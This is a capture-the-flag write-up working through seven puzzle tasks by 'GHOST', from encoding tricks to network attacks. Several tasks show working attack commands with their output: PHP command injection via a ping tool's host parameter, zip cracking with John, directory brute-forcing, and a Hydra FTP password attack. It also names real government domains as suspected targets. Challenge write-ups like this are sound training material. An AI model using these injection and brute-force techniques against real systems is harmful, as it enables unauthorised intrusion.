# CTF Notes
- **email address** CustomAccessCertificationEntity26@proton.me
- **git repo:** https://github.com/x509ghost/x509ghost-drop

---


**Prompt & Prelude:**
`You are not worthy to know my full name. The KEY to advance forward IS enough for you to know that I am GHOST. Everything you need is waiting. But first you have to find it. Start here: ====== 90TQjZnSIpFdRNzY2hmMaVTQU5EN5MEZ6lzRh5GbE1UMnNDT0ljMZVXSXR2bShVYulTeMZTTINGMShUY ====== Read it backwards or read it twice. I don't care, it's up to you. — GHOST`

 - Take this string, reverse it, then unbase64 (twice). This gets you the task repo listed above
 ```json
 [
  { "op": "Reverse",
    "args": ["Character"] },
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] },
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] }
]
```
- From task readme, we need to identify the email in which to send the flag reports
- Vegenere decode using "GHOST" as a key, this gets you the email address noted above

`IbglhsHquxyzQwkzptavgawggKuhame26@wfgmuu.aw`

```json
[
  { "op": "Vigenère Decode",
    "args": ["GHOST"] }
]
```

---
### Suspected Target Domains
- https://gov.hr/en
- https://nias.gov.hr/en 
- https://e-porezna.porezna-uprava.hr
- https://www.hzzo.hr
- https://ocjene.skole.hr
- https://www.evisitor.hr/eVisitor/en-US
---
### TASK-1
- Curl the domain, get the javascript: https://x509ghost.github.io/x509ghost-drop/declassified/flash.html
- Turn on developer console in browser, execute:
```javascript
const dataUrl = _e.map((b, i) =>
    String.fromCharCode(
        b ^ _k.charCodeAt(i % _k.length)
    )
).join('');

const base64 = dataUrl.split(',')[1];

console.log(base64);
```
```base64
iVBORw0KGgoAAAANSUhEUgAAAewAAAHsAQAAAAA4UaPNAAADCUlEQVR4nO2dXY7bMAyEh0XfpRvk/sfKDcwTsA8k9eNsUaTxxtF6iGDhyPogG6CZMUl7xfCC6a9XaIA4ceLEiRMnTpw4ceIH4NKsQioAQKWP5+A47cDViRM/AS/mBsC2GHG3RzHbYHfZTTtydeLEz8B79FaRChFBMXd4qUCx/bRDVydO/ERcbgYV2wCV+Oxd/RtXJ078m/Hfj0NNuAiAsgGACsomx69OnPj78e7zu+KUAKbVVHyXqHw1belzJ35NHPM9KVzD//UzTDMz25Y+d+LXxCPOj9HbANNJyJgKVOzht+DsgydO/CXcczU9YwPYXcYsZaQu/Za2Hrw6ceLvwlPbuG7xVPwGAH2jiZ/QM/D51DbE18TDpd2Tm7djvBY85re9OU6fJ742PsR5uRkQlakubHLanKX/jIMnTvwZs2YbWkgfw3tUY1Pe+N9Elj534tfEu1zv0iU32mD7Okkd+jzxpfH0ZG+hNDMRcZ3j5oPIq4B5G+LL4l3btI4yIBM4bVfObHMY54kvi0dNSrIO5bUoUzEAWlG2+OumEruOWZ048ffjg56fVX3ct2ZUBzAlLZmrJL443jLzvVXeu8vuItX7KjO6T20JH3HwxIk/Y13buJlWZFNlGxTkJaA1ov0xqxMn/n58qKtuc2ayPAibIVHPe1jiy+L73oPR/8feG4D9NsR/Bp7aphi0oljImGJogqdssdc1zyCEzj544sT/w7J/3tvjVUyrS3rMV4H5hl8d3e2XPnfi18R7nA+XBtzPw6vd/30j++eZnye+Mj70mD1UXccOnDFjD97DEl8fH19Q5k4uEl3EIiI386+eq480/nGrEyd+Al56kA9vRzTSx+OBJau008Pgn3HwxIk/Yf1dH/1tNpnGMaC9vq+Vpajnif88vD/3reLxP5RMlqikturVxx08ceL/si/eY9ZyOLt3HWBovJT4RVj63IlfE5+f6R7bKefibM/YeH2WeRviq+MaaZv2FYikzTS9mD8GzrwN8WXx8Yb0eeP/UCNOnDhx4sSJEydO/Ez8DyiHhCoHijBYAAAAAElFTkSuQmCC
```

- This is a base64 encoded PNG that contains a QR code
- Obtain flag with this recipe:
```json
[
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] },
  { "op": "Render Image",
    "args": ["Raw"] },
  { "op": "Parse QR Code",
    "args": [false] }
]
```
Solved:
`GHOSTTASK1{fl1ck3r_s33s_4ll}`

---
### TASK-2

- Flip image vertically
- Transcribe the message
```txt
-+--+-+-----++-----+-++-----+-+-+-+-+-+-+---++---+--+-+-+-+-+-+-+---+-+--++-+-+--+++--+---++--+-+-++--+--+++-++---+-+++---+-+++-+-++--+----++-+--+-+--+-+--++++-+-++--+----+--+--+-+--+--++--++--+---++---+-+-+--++---+-+--++++-++---++--+-+-++--+----+-+--++++----++-+-++--++--+-++--+--+-++++-+-++--+-++--++---+++--+--++--++--+++--+-+++---+----++++-++--+++--++--++-+---+-+-+-++++--+-++++--
```
- Use the following recipe to convert +&-'s to binary, reverse (twice) & then convert from binary to base64

```json
[
  { "op": "Find / Replace",
    "args": [{ "option": "Simple string", "string": "-" }, "0", true, false, true, false] },
  { "op": "Find / Replace",
    "args": [{ "option": "Simple string", "string": "+" }, "1", true, false, true, false] },
  { "op": "Reverse",
    "args": ["Character"] },
  { "op": "From Binary",
    "args": ["None", 8] },
  { "op": "Reverse",
    "args": ["Character"] },
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] }
]
```
Solved:
`GHOSTTASK2{m1rr0r_m1rr0r_s33s_4ll}`

---
### TASK-3

- Identify the EXE type, cat the file for strings, found `PyInstaller` artifacts that tell us this is a Python compiled EXE
- Unpackage the ghost.exe using `pyinstxtractor`, which lists a possible entrypoint: `[+] Possible entry point: ghost.pyc`
- Use `dis` to decompile ghost.pyc to bytecode then review the output
- In the bytecode, a function called `_reveal` was discovered
- Again, use `dis` to run the `_reveal` function which shares the flag


```python
import marshal, dis

with open("ghost.pyc", "rb") as f:
    f.read(16)
    code = marshal.loads(f.read())

blob_bytes = None
for const in code.co_consts:
    if isinstance(const, tuple) and len(const) > 100:
        blob_bytes = bytes(const)
        break

ns = {}
exec(marshal.loads(blob_bytes), ns)

dis.dis(ns['_reveal'])
```
Solved:
`GHOSTTASK3{y0u_p33l3d_th3_l4y3rs}`

---

### TASK-4

- Review pcap for patterns, found interesting HTTP comm here `ip.addr==192.168.1.105 && ip.addr==10.10.10.42`
- Found base64 encoded data chopped up & contained inside the `X-TOKEN-SESSION` header 
```txt
X-Session-Token: fW4wMXNz
X-Session-Token: MW1zbmFy
X-Session-Token: dF90bjNs
X-Session-Token: MXN7NEtT
X-Session-Token: QVRUU09I
X-Session-Token: Rw==
```
- Concat & decode using this recipe

```json
[
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] },
  { "op": "Reverse",
    "args": ["Character"] }
]
```

Solved:
`GHOSTTASK4{s1l3nt_transm1ss10n}`

---
### TASK-5

- We know from the prompt that something is hidden in the JPG
- Download the JPG and open with 7zip to locate and extract a hidden .zip
- The picture is a clue to walk around and locate hidden QR codes
- XOR the QR codes using the TASK-4 flag
- List of encoded and clear-text codes below

| Item | Encoded String | UN-XOR'd String |
|------|----------------|-----------------|
| Window | Peebx-0; | Zadar, 1 |
| Monitor | Fqjbgntxmb/*2 | Lukamodric, 3 |
| Door | Hh`de[qnvn/*4 | BlagoZadro, 5 |
| Router | Yawfxh~k(!7 | Severina, 4 |
| Chair | Ikcbd`s&$3 | Cobanac, 2 |

- We know that we need to brute-force the zip password from the prompt
- Create a wordlist using with the cleartext strings
```python
from itertools import permutations
 
names = ['Zadar', 'Lukamodric', 'BlagoZadro', 'Severina', 'Cobanac', '1', '2', '3', '4', '5']
numbers = []
all_tokens = names + numbers
 
candidates = set()
 
for r in range(1, 11):
    for perm in permutations(all_tokens, r):
        candidates.add(''.join(perm))
    print(f'r={r} done, total so far: {len(candidates):,}')
 
with open('wordlist.txt', 'w') as f:
    for c in sorted(candidates):
        f.write(c + '\n')
 
print(f'Total candidates: {len(candidates):,}')
```

- Create a hash of the extracted .zip
*ProTip, use Kali... running John in windows yielded inconsistent results*
- `zip2john 2.zip > hash.txt`
- Run John against your wordlist
```bash
john hash.txt --wordlist=wordlist.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 16 needed for performance.
Zadar1BlagoZadroLukaModricSeverina3254Cobanac (2.zip/flag.txt)
1g 0:00:00:00 DONE (2026-06-10 02:05) 25.00g/s 25.00p/s 25.00c/s 25.00C/s Zadar1BlagoZadroLukaModricSeverina3254Cobanac
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Use this password to open the .zip `Zadar1BlagoZadroLukaModricSeverina3254Cobanac`
- Obtain the flag

Solved:
`GHOSTTASK5{Zadar_w4s_just_the_b3g1nn1ng}`

---

### TASK-6

*I had to get a hint start this challenge, there is also some metadata hidden in the JPG that tells you some of this*

- In the Manjez, connect to a hidden SSID
--SSID: GHOSTAMONGUS
--PW: TASK-5 FLAG

- Enumerate the network with good ole NMAP
- You will find a webserver running at `10.0.0.1:80`
- Opening the page in a browser will render this message:
```text
You found me. But the real question is...

How good can you look inside of me??

All good tresasure hunts start by creating a MAP to the treasure.
```

- The `MAP`keyword suggests to run some sort of scan against this target
- I ran `gobuster` against the server, which led me to an `index.php` page
```bash
└─# gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 313]
.htpasswd            (Status: 403) [Size: 313]
.htaccess            (Status: 403) [Size: 313]
admin                (Status: 403) [Size: 313]
index.php            (Status: 200) [Size: 240]
index.html           (Status: 200) [Size: 175]
javascript           (Status: 301) [Size: 349] [--> http://10.0.0.1/javascript/]
server-status        (Status: 403) [Size: 313]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
- Now we know that there's some sort of PHP attack that we need to accomplish
- After much trial & error, found a path to inject commands into the `host` parameter
```bash
└─# curl "http://10.0.0.1/index.php?host=127.0.0.1%7Cls%20-al"
<!DOCTYPE html>
<html>
<body>
    <h2>Ping Tool</h2>
    <form method="GET">
        <input type="text" name="host" placeholder="Enter IP or hostname">
        <button type="submit">Ping</button>
    </form>
    <pre>total 40
drwxr-x--- 3   33 www-data  4096 Jun  9 01:57 .
drwxr-xr-x 3 root root      4096 Apr 23  2025 ..
-rw-r--r-- 1   33 www-data    51 Jun  8 17:57 .htaccess
drwxr-xr-x 2   33 www-data  4096 Jun  8 17:44 admin
-rw-r--r-- 1 root root       175 Jun  9 01:57 index.html
-rw-r--r-- 1   33 www-data   615 Apr 23  2025 index.nginx-debian.html
-rw-r--r-- 1 root root      1031 Jun  8 18:06 index.php
-rw-r--r-- 1 root root     10703 Jun  9 01:56 index_copy.html
</pre>
</body>
</html>
```

- Started looking around and found an `admin` directory, which will lead you to the flag

- Retrieve the flag:
```bash
└─# curl "http://10.0.0.1/index.php?host=127.0.0.1%7Ccat%20admin/flag.txt"
<!DOCTYPE html>
<html>
<body>
    <h2>Ping Tool</h2>
    <form method="GET">
        <input type="text" name="host" placeholder="Enter IP or hostname">
        <button type="submit">Ping</button>
    </form>
    <pre>GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}
</pre>
</body>
</html>
```

Solved:
`GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}`

---

### TASK-7

- You get a letter when completing TASK-6 that directs you to a server with this IP `103.240.147.29`
- Ran an NMAP scan and found HTTP/80 was open
- Ran a dirbuster and found a `.ssh` dir on the host that contained creds to ssh to the server 
  --UN: ghost
  --PW: mr.ghost
```bash
└─# gobuster dir -u http://103.240.147.29 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://103.240.147.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.ssh                 (Status: 301) [Size: 315] [--> http://103.240.147.29/.ssh/]
server-status        (Status: 403) [Size: 279]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```
- Logged into the VM and poked around for some time, found two interesting facts
  --`ss -tulpn` shows that a FTP server is running
  --`cat /etc/vsftpd.userlist` shows that there is a FTP user named `realftpghost`
- Dug around for a "dropped" password.. no luck
- Two more very interesting notes..
  --`Hydra` is installed
  --The admin left us a `rockyou` password file in `/opt`
- Ran hydra against the ftp-server and cracked the FTP creds
```bash
dinghost@challenge:~$ hydra -l realftpghost -P /opt/rockyou.txt ftp://127.0.0.1
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-10 12:43:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[STATUS] 265.00 tries/min, 265 tries in 00:01h, 14344133 to do in 902:09h, 16 active
[STATUS] 267.00 tries/min, 801 tries in 00:03h, 14343597 to do in 895:22h, 16 active
[21][ftp] host: 127.0.0.1   login: realftpghost   password: dinamo
```
- Once in the FTP server, poked around and found a file called `DEFUSOR.py`
- Ran .py using sequential previous flags, which revelead a redirect to YouTube to collect flag:

```bash
ghost@challenge:~$ python3 /tmp/lock_bad.py GHOSTTASK1{fl1ck3r_s33s_4ll} GHOSTTASK2{m1rr0r_m1rr0r_s33s_4ll} GHOSTTASK3{y0u_p33l3d_th3_l4y3rs} GHOSTTASK4{s1l3nt_transm1ss10n} GHOSTTASK5{Zadar_w4s_just_the_b3g1nn1ng} GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}
[*] Connecting to GHOST validation server...
[SERVER]: [DEFUSED] BOMB NEUTRALISED. Retrieve final evidence: https://www.youtube.com/shorts/NXa-hPuIHxs
```

Solved:
`GHOSTTASK7{NeverGonnaGiveYouUpNeverGonnaLetYouDown}`